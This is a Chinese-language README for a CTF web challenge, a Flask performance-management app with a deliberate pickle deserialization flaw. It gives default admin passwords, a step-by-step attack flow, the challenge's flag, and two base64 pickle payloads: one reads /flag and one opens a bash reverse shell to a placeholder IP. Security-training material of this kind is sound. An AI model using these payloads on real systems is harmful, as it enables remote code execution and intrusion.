# 员工绩效管理系统 - CTF Web 题目

## 题目背景

这是一个模拟真实企业内部的员工绩效管理系统，包含完整的用户认证、数据管理和模板配置功能。系统看起来非常专业和真实，但隐藏着一个危险的安全漏洞。

## 题目描述

某大型科技公司的内部绩效管理系统疑似存在安全漏洞。作为安全研究员，你需要找到并利用这个漏洞，获取服务器权限。

目标：获取位于服务器根目录的flag文件内容。

**提示：关注系统的"高级功能"**

## 技术栈

- 后端：Python Flask
- 前端：Bootstrap 5 + HTML/CSS/JavaScript
- 数据库：SQLite
- 部署：Docker

## 安装运行

### 本地开发环境

```bash
# 1. 安装依赖
pip install -r requirements.txt

# 2. 运行应用
python app.py

# 3. 访问系统
http://localhost:5000
```

### Docker 部署

```bash
# 构建镜像
docker build -t performance-system .

# 运行容器
docker run -p 5000:5000 performance-system
```

## 默认账户

系统预设了以下测试账户：

| 用户名 | 密码 | 角色 | 部门 |
|--------|------|------|------|
| admin | admin@2024 | admin | HR |
| manager1 | manager123 | manager | Engineering |
| employee1 | emp2024 | employee | Engineering |
| hr_lead | hr_secure | hr | HR |

## 系统功能

### 普通用户功能
- 用户登录/登出
- 查看个人绩效评估
- 查看个人资料
- 系统帮助文档

### 管理员功能
- 所有普通用户功能
- 模板管理（创建、编辑、预览）
- 系统管理面板
- 用户管理

### 关键功能：模板系统

系统的模板功能支持：
- 标准JSON变量配置
- **高级序列化变量配置** ⚠️

模板变量支持两种格式：
1. 标准JSON：`{"key": "value"}`
2. 序列化格式：`pickle:<base64编码数据>`

## 漏洞分析

### 漏洞类型
Python Pickle 反序列化漏洞 (CWE-502)

### 漏洞位置
- 文件：`app.py`
- 函数：`preview_template()`
- 路由：`/admin/templates/preview`

### 漏洞原理
模板预览功能为了支持"复杂的变量配置"，允许用户提交序列化的Python对象。系统会检查变量字符串是否以`pickle:`开头，如果是，就会进行base64解码后使用`pickle.loads()`反序列化，这导致了远程代码执行漏洞。

### 利用条件
1. 需要管理员权限（admin角色）
2. 访问模板管理功能
3. 使用模板预览功能
4. 提交恶意的pickle序列化数据

## 攻击流程

### 1. 获取管理员权限
使用默认管理员账户登录：
- 用户名：`admin`
- 密码：`admin@2024`

### 2. 访问模板管理
导航到：系统管理 → 模板管理 → 创建新模板

### 3. 构造攻击载荷
使用`generate_payload.py`脚本生成payload：

```bash
python generate_payload.py
```

### 4. 执行攻击
在"变量配置"字段中输入恶意payload，然后点击"预览效果"。

## Payload 示例

### 读取flag文件
```json
{
  "content": "测试模板 {{test}}",
  "variables": "pickle:gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhjYXQgL2ZsYWeUhZRSlC4="
}
```

### 反弹shell
```json
{
  "content": "测试模板 {{test}}",
  "variables": "pickle:gASVWgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwL3lvdXJfaXAvNDQ0NCAwPiYxJ5SFlFKULg=="
}
```

## 防护建议

1. **禁用pickle反序列化**：不要反序列化不受信任的数据
2. **输入验证**：严格验证用户输入格式
3. **权限控制**：限制危险功能的访问权限
4. **安全编码**：使用安全的序列化格式（如JSON）
5. **代码审计**：定期进行安全代码审计

## flag格式

```
wmctf{P1ckl3_D3s3r14l1z4t10n_1s_D4ng3r0us_4nd_RCE}
```

## 难度等级

**高级** - 需要理解pickle反序列化漏洞原理，具备代码审计能力。

---

**注意：此系统仅用于CTF比赛和安全研究，请勿用于非法用途。** 